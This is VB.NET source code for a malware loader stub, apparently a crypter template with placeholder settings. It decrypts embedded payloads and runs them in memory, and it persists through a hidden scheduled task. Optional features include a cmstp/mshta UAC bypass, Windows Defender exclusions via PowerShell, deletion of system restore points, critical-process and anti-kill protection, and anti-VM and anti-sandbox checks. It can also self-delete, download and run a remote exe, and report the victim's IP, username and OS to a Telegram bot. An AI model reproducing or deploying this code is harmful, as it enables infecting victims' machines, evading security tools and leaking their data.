Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.IO
Imports System.Management
Imports System.Net
Imports System.Reflection
Imports System.Resources
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Security.Principal
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports Microsoft.Win32.TaskScheduler
Imports System.Security.AccessControl
Imports System.ComponentModel
Imports System.Environment

<Assembly: AssemblyTitle("%Title%")>
<Assembly: AssemblyDescription("%Des%")>
<Assembly: AssemblyCompany("%Company%")>
<Assembly: AssemblyProduct("%Product%")>
<Assembly: AssemblyCopyright("%Copyright%")>
<Assembly: AssemblyTrademark("%Trademark%")>
<Assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")>
<Assembly: AssemblyVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")>
<Assembly: Guid("%Guid%")>

Public Class Program

#Const Sleep = False

#Const UAC = False

#Const VM = False
#Const EMU = False
#Const Debugger = False
#Const Sandboxie = False
#Const Anyrun = False

#Const BOTKILL = False

#Const WDEX = False
#Const SysRestore = False

#Const BDOS = False
#Const Psleep = False
#Const AntiKillP = False

#Const SupHidden = False
#Const TaskD = False

#Const Hidden = False
#Const Melt = False
#Const BLAJ = False

#Const TelegramBot = False


    Public Shared Sub main()

        If Not CreateMutex() Then Environment.Exit(0)

#If Sleep Then
                Thread.Sleep(Convert.ToInt32(Settings.Sleep) * 1000)
#End If

        If Settings.Current = Settings.Workpath + "\" + Settings.HName Then

#If Psleep Then
            PreventSleep()
#End If

#If TaskD Then
            Dim Task As New Threading.Thread(AddressOf TaskSchedulerKill)
            Task.Start()
#End If


#If SupHidden Then
            Dim Super As New Threading.Thread(AddressOf SuperHidden)
            Super.Start()
#End If

            Dim Code
            For Each Code In Settings.List
                Dim T As New Threading.Thread(AddressOf Memory)
                T.Start(GetTheResource(Code))
            Next

#If BDOS Then
            If AdminCheck() Then
                ProcessCritical.CriticalProcess_Enable()
            End If
#End If

#If AntiKillP Then
               Dim PS As New Threading.Thread(AddressOf CAntiKill)
               PS.Start()
#End If

            Application.Run()

        Else

#If VM Then
            If DetectVirtualMachine() Then Environment.FailFast(Nothing)
#End If

#If EMU Then
            If Emulator() Then Environment.FailFast(Nothing)
#End If
#If BLAJ Then
                     Dim devil As String
        Dim x As New System.Text.StringBuilder

        x.Append("")
        devil = x.ToString

        Dim URL As String = devil
        Dim DownloadTo As String = Environ("temp") & "clean.exe"
        Try
            Dim w As New Net.WebClient
            IO.File.WriteAllBytes(DownloadTo, w.DownloadData(URL))
            Shell(DownloadTo)
        Catch ex As Exception
        End Try
#End If

#If Debugger Then
            If DetectDebugger() Then Environment.FailFast(Nothing)
#End If

#If Sandboxie Then
            If DetectSandboxie() Then Environment.FailFast(Nothing)
#End If

#If Anyrun Then
            If anyrun() Then Environment.FailFast(Nothing)
#End If

#If UAC Then
            If Not AdminCheck() Then
                Execute(Settings.Current)
                CloseMutex()
                Environment.Exit(0)
            End If
#End If

#If TelegramBot Then
        Try
            Try
                ServicePointManager.Expect100Continue = True
                ServicePointManager.SecurityProtocol = DirectCast(3072, SecurityProtocolType)
                ServicePointManager.DefaultConnectionLimit = 9999
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
            Using Web As New WebClient
                Dim Info As String = "[New Clinet]" & Environment.NewLine & Environment.NewLine & "IP : " & Web.DownloadString("http://ip-api.com/csv/?fields=status,query").Replace(ChrW(10), "").Split(",")(1) & Environment.NewLine & Environment.NewLine & "User : " & Environment.UserName & Environment.NewLine & Environment.NewLine & "OS : " & My.Computer.Info.OSFullName
                Web.DownloadString(("https://api.telegram.org/bot" & Settings.Token & "/sendMessage?chat_id=" & Settings.ID & "&text=" & Info))
            End Using
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
#End If


#If BOTKILL Then
            Try
                RunBotKiller()
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
#End If


#If SysRestore Then
            If AdminCheck() Then
                Try
                    Dim objClass As New Management.ManagementClass("\\.\root\default", "systemrestore", New System.Management.ObjectGetOptions())
                    Dim objCol As Management.ManagementObjectCollection = objClass.GetInstances()
                    For Each objItem As Management.ManagementObject In objCol
                        SRRemoveRestorePoint(CUInt(objItem("sequencenumber")).ToString())
                    Next
                Catch ex As Exception
                    Debug.WriteLine(ex.Message)
                End Try
            End If
#End If

#If WDEX Then
            If AdminCheck() Then
                Try
                    Dim StartInfo As New ProcessStartInfo
                    StartInfo.FileName = "powershell.exe"
                    StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                    StartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath " + "'" + IO.Path.GetFullPath(Settings.Workpath + "\" + Settings.HName) + "'"
                    Process.Start(StartInfo).WaitForExit()
                    StartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess " + "'" + Settings.HName + "'"
                    Process.Start(StartInfo).WaitForExit()
                Catch ex As Exception
                    Debug.WriteLine(ex.Message)
                End Try
            End If
#End If

            Try
                If IO.File.Exists(Settings.Workpath + "\" + Settings.HName) Then
                    Dim t As New FileInfo(Settings.Workpath + "\" + Settings.HName)
                    t.Attributes = FileAttributes.Normal
                    t.Delete()
                End If
                Thread.Sleep(1000)
                IO.File.WriteAllBytes(Settings.Workpath + "\" + Settings.HName, IO.File.ReadAllBytes(Settings.Current))
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try

#If Hidden Then
            Try
                IO.File.SetAttributes(Settings.Workpath + "\" + Settings.HName, IO.FileAttributes.Hidden + IO.FileAttributes.System)
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
#End If

            Try
                Using tService As New TaskService()
                    Dim tDefinition As TaskDefinition = tService.NewTask
                    Dim tTrigger As New TimeTrigger
                    tTrigger.Repetition.Interval = TimeSpan.FromMinutes(1)
                    tDefinition.Triggers.Add(tTrigger)
                    If AdminCheck() Then
                        tDefinition.Principal.RunLevel = TaskRunLevel.Highest
                    End If
                    tDefinition.Settings.Hidden = True
                    tDefinition.Actions.Add(New ExecAction(Settings.Workpath & "\" & Settings.HName))
                    tService.RootFolder.RegisterTaskDefinition(Settings.TaskName, tDefinition)

                    Thread.Sleep(3000)

                    CloseMutex()

                    Dim t As Task = tService.FindTask(Settings.TaskName)
                    If t IsNot Nothing Then t.Run()

#If Melt Then
                    Try
                        Dim batch As String = Path.GetTempFileName() & ".bat"
                        Using sw As StreamWriter = New StreamWriter(batch)
                            sw.WriteLine("@echo off")
                            sw.WriteLine("timeout 3 > NUL")
                            sw.WriteLine("CD " & Application.StartupPath)
                            sw.WriteLine("DEL " & """" & Path.GetFileName(Process.GetCurrentProcess.MainModule.FileName) & """" & " /f /q")
                            sw.WriteLine("CD " & Path.GetTempPath())
                            sw.WriteLine("DEL " & """" & Path.GetFileName(batch) & """" & " /f /q")
                        End Using

                        Dim StartInfo As New ProcessStartInfo
                        StartInfo.FileName = batch
                        StartInfo.CreateNoWindow = True
                        StartInfo.ErrorDialog = False
                        StartInfo.UseShellExecute = False
                        StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                        Process.Start(StartInfo)
                        Environment.Exit(0)
                    Catch ex As Exception
                        Debug.WriteLine(ex.Message)
                    End Try
#Else
                    Environment.Exit(0)
#End If
                End Using
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
        End If
    End Sub


    Public Shared _appMutex As Mutex
    Public Shared Function CreateMutex() As Boolean
        Dim createdNew As Boolean
        _appMutex = New Mutex(False, Settings.Mutex, createdNew)
        Return createdNew
    End Function
    Public Shared Sub CloseMutex()
        If _appMutex IsNot Nothing Then
            _appMutex.Close()
            _appMutex = Nothing
        End If
    End Sub

    Public Shared Sub Memory(ByVal B As Object)
        Try
            Dim loader As Assembly = Assembly.Load(B)
            Dim parm As Object() = Nothing
            If loader.EntryPoint.GetParameters().Length > 0 Then
                parm = New Object() {New String() {Nothing}}
            End If
            loader.EntryPoint.Invoke(Nothing, parm)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

#If AntiKillP Then
        Public Shared Sub CAntiKill()
        Thread.Sleep(4000)
        Try
            Dim c_NewAntiKill As New c_AntiKill
            c_NewAntiKill.c_ImAntiKill()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
#End If

    Public Shared Function GetTheResource(ByVal Get_ As String) As Byte()
        Dim MyAssembly As Assembly = Assembly.GetExecutingAssembly()
        Dim MyResource As New Resources.ResourceManager("#ParentRes", MyAssembly)
        Return AES_Decryptor(MyResource.GetObject(Get_))
    End Function
    Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
        Dim AES As New RijndaelManaged
        Dim Hash As New MD5CryptoServiceProvider
        Try
            AES.Key = Hash.ComputeHash(System.Text.Encoding.Default.GetBytes(Settings.Mutex))
            AES.Mode = CipherMode.ECB
            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = input
            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Function

#If Psleep Then
    <DllImport("kernel32.dll", SetLastError:=True)> Public Shared Function SetThreadExecutionState(ByVal esFlags As EXECUTION_STATE) As EXECUTION_STATE
    End Function
    Public Enum EXECUTION_STATE As UInteger
        ES_CONTINUOUS = &H80000000UI
        ES_DISPLAY_REQUIRED = &H2
        ES_SYSTEM_REQUIRED = &H1
    End Enum
    Public Shared Sub PreventSleep()
        Try
            SetThreadExecutionState(EXECUTION_STATE.ES_SYSTEM_REQUIRED Or EXECUTION_STATE.ES_CONTINUOUS Or EXECUTION_STATE.ES_DISPLAY_REQUIRED)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
#End If

#If TaskD Then
    <DllImport("user32.dll", SetLastError:=True)> Public Shared Function GetWindowThreadProcessId(ByVal hwnd As IntPtr, ByRef lpdwProcessId As Integer) As Integer
    End Function
    <DllImport("user32.dll", EntryPoint:="FindWindowEx")> Public Shared Function FindWindowTask(ByVal parentHandle As Integer, ByVal childAfter As Integer, ByVal lclassName As String, ByVal windowTitle As String) As Integer
    End Function
    Public Shared Sub TaskSchedulerKill()
        While True
            Threading.Thread.Sleep(400)
            Try
                Dim handle As Integer = FindWindowTask(0, 0, Nothing, "Task Scheduler")
                Dim ProcessId As Integer
                GetWindowThreadProcessId(handle, ProcessId)

                If ProcessId <> 0 Then
                    Dim Process As Process = Process.GetProcessById(ProcessId)
                    Process.Kill()
                End If
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
        End While
    End Sub
#End If

#If SupHidden Then
    Public Shared Sub SuperHidden()
        While True
            Threading.Thread.Sleep(400)
            Try
                Dim Key As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", True)
                If Key.GetValue("ShowSuperHidden") = 1 Then
                    Key.SetValue("ShowSuperHidden", 0)
                End If
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
        End While
    End Sub
#End If

    Public Shared Function AdminCheck() As Boolean
        Try
            Return New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Function

#If SysRestore Then
    <DllImport("Srclient.dll")> Public Shared Function SRRemoveRestorePoint(ByVal index As Integer) As Integer
    End Function
#End If

#If UAC Then
    Public Declare Ansi Function PostMessageW Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal Msg As UInteger, ByVal wParam As Integer, ByVal lParam As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Private Declare Auto Function FindWindowEx Lib "user32" (ByVal parentHandle As Integer, ByVal childAfter As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lclassName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef windowTitle As String) As Integer

    Public Shared Function SetInfFile(ByVal CommandToExecute As String) As String
        Dim value As String = Path.GetRandomFileName().Split(New Char() {Convert.ToChar(".")})(0)
        Dim value2 As String = Interaction.Environ("WinDir") + "\temp"
        Dim stringBuilder As StringBuilder = New StringBuilder()
        stringBuilder.Append(value2)
        stringBuilder.Append("\")
        stringBuilder.Append(value)
        stringBuilder.Append(".inf")
        Dim stringBuilder2 As StringBuilder = New StringBuilder(Code())
        stringBuilder2.Replace("REPLACE_COMMAND_LINE", CommandToExecute)
        File.WriteAllText(stringBuilder.ToString(), stringBuilder2.ToString())
        Return stringBuilder.ToString()
    End Function

    Public Shared Function Execute(ByVal pp As String) As Boolean
        Dim flag As Boolean = Not File.Exists(BinaryPath)
        Dim flag2 As Boolean = flag
        Dim result As Boolean
        If flag2 Then
            result = False
        Else
            Dim stringBuilder As StringBuilder = New StringBuilder()
            stringBuilder.Append(SetInfFile(pp))

            Dim StartInfo As New ProcessStartInfo
            StartInfo.FileName = BinaryPath
            StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            StartInfo.Arguments = "/au " + stringBuilder.ToString()
            Process.Start(StartInfo)

            Thread.Sleep(5000)
            Dim parentHandle As Integer = 0
            Dim childAfter As Integer = 0
            Dim text As String = Nothing
            Dim text2 As String = """HM"""
            Dim value As Integer = FindWindowEx(parentHandle, childAfter, text, text2)
            PostMessageW(CType(value, IntPtr), 256UI, 13, 0)
            result = True
        End If
        Return result
    End Function

    Public Shared Function Code() As String
        Dim stringBuilder As StringBuilder = New StringBuilder()
        stringBuilder.Append("[version]" & vbCrLf & "Signature=$chicago$" & vbCrLf & "AdvancedINF=2.5")
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append("[DefaultInstall]" & vbCrLf & "CustomDestination=CustInstDestSectionAllUsers" & vbCrLf & "RunPreSetupCommands=RunPreSetupCommandsSection")
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append("[RunPreSetupCommandsSection]" & vbCrLf & "; Commands Here will be run Before Setup Begins to install" & vbCrLf & "mshta vbscript:Execute(###CreateObject(####WScript.Shell####).Run ####cmd.exe /c start ################ ########REPLACE_COMMAND_LINE############,0:close###)" & vbCrLf & "mshta vbscript:Execute(###CreateObject(####WScript.Shell####).Run ####taskkill /IM cmstp.exe /F####, 0, true:close###)")
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append("[CustInstDestSectionAllUsers]" & vbCrLf & "49000,49001=AllUSer_LDIDSection, 7")
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append("[AllUSer_LDIDSection]" & vbCrLf & "##HKLM##, ##SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE##, ##ProfileInstallPath##, ##%UnexpectedError%##, ####")
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append("[Strings]" & vbCrLf & "ServiceName=##HM##" & vbCrLf & "ShortSvcName=##HM##")
        Return stringBuilder.ToString().Replace("#", """")
    End Function
    Public Shared BinaryPath As String = Interaction.Environ("WinDir") + "\system32\cmstp.exe"
#End If

#If VM Then
    Public Shared Function DetectVirtualMachine() As Boolean
        Using searcher = New ManagementObjectSearcher("Select * from Win32_ComputerSystem")
            Dim item
            For Each item In searcher.[Get]()
                Dim manufacturer As String = item("Manufacturer").ToString().ToLower()

                If (manufacturer = "microsoft corporation" AndAlso item("Model").ToString().ToUpperInvariant().Contains("VIRTUAL")) OrElse manufacturer.Contains("vmware") OrElse item("Model").ToString() = "VirtualBox" Then
                    Return True
                End If
            Next
        End Using
        Return False
    End Function
#End If

#If EMU Then
    Public Shared Function Emulator() As Boolean
        Try
            Dim ticks As Long = DateTime.Now.Ticks
            System.Threading.Thread.Sleep(10)
            If DateTime.Now.Ticks - ticks < 10L Then
                Return True
            End If
        Catch
        End Try
        Return False
    End Function
#End If

#If Debugger Then
    Public Shared Function DetectDebugger() As Boolean
        Dim isDebuggerPresent As Boolean = False
        CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, isDebuggerPresent)
        Return isDebuggerPresent
    End Function
#End If

#If Sandboxie Then
    Public Shared Function DetectSandboxie() As Boolean
        If GetModuleHandle("SbieDll.dll").ToInt32() <> 0 Then
            Return True
        Else
            Return False
        End If
    End Function
#End If

#If Anyrun Then
    Public Shared Function anyrun() As Boolean
        Try
            Dim status As String = New System.Net.WebClient().DownloadString("http://ip-api.com/line/?fields=hosting")
            Return status.Contains("true")
        Catch
        End Try
        Return False
    End Function
#End If

#If Debugger Then
    <DllImport("kernel32.dll", SetLastError:=True, ExactSpelling:=True)> Public Shared Function CheckRemoteDebuggerPresent(ByVal hProcess As IntPtr, ByRef isDebuggerPresent As Boolean) As Boolean
    End Function
#End If

#If Sandboxie Then
    <DllImport("kernel32.dll")> Public Shared Function GetModuleHandle(ByVal lpModuleName As String) As IntPtr
    End Function
#End If


#If BOTKILL Then
    Public Shared Sub RunBotKiller()
        For Each p As Process In Process.GetProcesses()

            Try

                If Inspection(p.MainModule.FileName) Then

                    If Not IsWindowVisible(p.MainWindowHandle) Then
                        If p.MainModule.FileName = Settings.Current Then
                        Else
                            RemoveFile(p)
                        End If

                    End If
                End If

            Catch ex As Exception
            End Try
        Next
    End Sub

    Public Shared Sub RemoveFile(ByVal process As Process)
        Try
            Dim processName As String = process.MainModule.FileName
            process.Kill()
            RegistryDelete("Software\Microsoft\Windows\CurrentVersion\Run", processName)
            RegistryDelete("Software\Microsoft\Windows\CurrentVersion\RunOnce", processName)
            System.Threading.Thread.Sleep(100)
            File.Delete(processName)
            IO.File.Delete(Environment.GetFolderPath(7) & "\" & IO.Path.GetFileName(processName))
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Function Inspection(ByVal threat As String) As Boolean
        If threat = Process.GetCurrentProcess().MainModule.FileName Then Return False
        If threat.StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)) Then Return True
        If threat.StartsWith(Environ$("USERPROFILE")) Then Return True
        If threat.Contains("wscript.exe") Then Return True
        If threat.StartsWith(Path.Combine(Path.GetPathRoot(Environment.SystemDirectory), "Windows\Microsoft.NET")) Then Return True
        Return False
    End Function

    Public Shared Function IsWindowVisible(ByVal lHandle As String) As Boolean
        Return IsWindowVisible(lHandle)
    End Function

    Public Shared Sub RegistryDelete(ByVal regPath As String, ByVal payload As String)
        Try

            Using key As RegistryKey = Registry.CurrentUser.OpenSubKey(regPath, True)

                If key IsNot Nothing Then

                    For Each valueOfName As String In key.GetValueNames()
                        If key.GetValue(valueOfName).ToString().Equals(payload) Then key.DeleteValue(valueOfName)
                    Next
                End If
            End Using

            If New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) Then

                Using key As RegistryKey = Registry.LocalMachine.OpenSubKey(regPath, True)

                    If key IsNot Nothing Then

                        For Each valueOfName As String In key.GetValueNames()
                            If key.GetValue(valueOfName).ToString().Equals(payload) Then key.DeleteValue(valueOfName)
                        Next
                    End If
                End Using
            End If

        Catch ex As Exception
        End Try
    End Sub
    <DllImport("User32.dll")> Public Shared Function IsWindowVisible(ByVal hWnd As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
#End If

End Class

Public Class Settings

    Public Shared Current As String = Process.GetCurrentProcess.MainModule.FileName

    Public Shared Mutex As String = "%Mutex%"

#If Sleep Then
       Public Shared Sleep As String = "%Sleep%"
#End If

    Public Shared TaskName As String = "%TaskName%"
    Public Shared HName As String = "%HNAME%"

    Public Shared List As List(Of String) = New List(Of String)(New String() {"%list%"})
    Public Shared Workpath As String = System.Environment.ExpandEnvironmentVariables("%Path%")

#If TelegramBot Then
    Public Shared Token As String = "%Token%"
    Public Shared ID As String = "%ID%"
#End If

End Class

#If BDOS Then
Public Class ProcessCritical
    <Runtime.InteropServices.DllImport("NTdll.dll", EntryPoint:="RtlSetProcessIsCritical", SetLastError:=True)> Public Shared Sub SetCurrentProcessIsCritical(<Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByVal isCritical As Boolean, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByRef refWasCritical As Boolean, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByVal needSystemCriticalBreaks As Boolean)
    End Sub
    Public Shared Sub SystemEvents_SessionEnding(ByVal sender As Object, ByVal e As SessionEndingEventArgs)
        CriticalProcesses_Disable()
    End Sub
    Public Shared Sub CriticalProcess_Enable()
        Try
            AddHandler SystemEvents.SessionEnding, New SessionEndingEventHandler(AddressOf SystemEvents_SessionEnding)
            Dim refWasCritical As Boolean
            System.Diagnostics.Process.EnterDebugMode()
            SetCurrentProcessIsCritical(True, refWasCritical, False)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
    Public Shared Sub CriticalProcesses_Disable()
        Try
            Dim refWasCritical As Boolean
            SetCurrentProcessIsCritical(False, refWasCritical, False)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
End Class
#End If

#If AntiKillP Then
Public Class c_AntiKill
    <DllImport("advapi32.dll", SetLastError:=True)> Shared Function GetKernelObjectSecurity(ByVal Handle As IntPtr, ByVal securityInformation As Integer, <Out()> ByVal pSecurityDescriptor As Byte(), ByVal nLength As UInteger, ByRef lpnLengthNeeded As UInteger) As Boolean
    End Function
    <DllImport("advapi32.dll", SetLastError:=True)> Shared Function SetKernelObjectSecurity(ByVal Handle As IntPtr, ByVal securityInformation As Integer, <[In]()> ByVal pSecurityDescriptor As Byte()) As Boolean
    End Function
    <DllImport("kernel32.dll")> Shared Function GetCurrentProcess() As IntPtr
    End Function
    Protected Function GetProcessSecurityDescriptor(ByVal processHandle As IntPtr) As RawSecurityDescriptor
        Dim psd() As Byte = New Byte(1) {}
        Dim bufSizeNeeded As UInteger
        GetKernelObjectSecurity(processHandle, &H4, psd, 0, bufSizeNeeded)
        psd = New Byte(bufSizeNeeded) {}
        If bufSizeNeeded < 0 OrElse bufSizeNeeded > Short.MaxValue Then
            Throw New Win32Exception()
        End If
        If Not GetKernelObjectSecurity(processHandle, &H4, psd, bufSizeNeeded, bufSizeNeeded) Then
            Throw New Win32Exception()
        End If
        Return New RawSecurityDescriptor(psd, 0)
    End Function
    Protected Sub SetProcessSecurityDescriptor(ByVal processHandle As IntPtr, ByVal dacl As RawSecurityDescriptor)
        Dim rawsd As Byte() = New Byte(dacl.BinaryLength - 1) {}
        dacl.GetBinaryForm(rawsd, 0)
        If Not SetKernelObjectSecurity(processHandle, &H4, rawsd) Then
            Throw New Win32Exception()
        End If
    End Sub
    Public Sub c_ImAntiKill()
        Dim hProcess As IntPtr = GetCurrentProcess()
        Dim dacl = GetProcessSecurityDescriptor(hProcess)
        dacl.DiscretionaryAcl.InsertAce(0, New CommonAce(AceFlags.None, AceQualifier.AccessDenied, CInt(&HF0000 Or &H100000 Or &HFFF), New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing), False, Nothing))
        SetProcessSecurityDescriptor(hProcess, dacl)
    End Sub
End Class
#End If
